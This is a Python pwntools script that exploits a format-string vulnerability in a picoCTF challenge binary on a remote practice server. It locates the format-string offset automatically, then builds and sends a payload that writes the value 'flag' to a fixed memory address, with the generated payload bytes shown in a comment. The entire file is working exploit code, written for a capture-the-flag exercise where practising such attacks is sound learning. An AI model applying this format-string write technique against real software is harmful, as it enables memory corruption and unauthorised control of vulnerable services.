from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

local = False
host = 'rhea.picoctf.net'
port = 62316
program = './vuln'
context.binary = ELF('./vuln')

if local:
    io = process('./vuln')
else: 
    io = remote(host, port)

def exec_fmt(payload):
    if local:
        io = process('./vuln')
    else: 
        io = remote(host, port)
    io.sendline(payload)
    return io.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(f"Offset {offset}")
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
print(payload)

# b'%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00'
io.recv()
io.sendline(payload)
print(io.recvall())
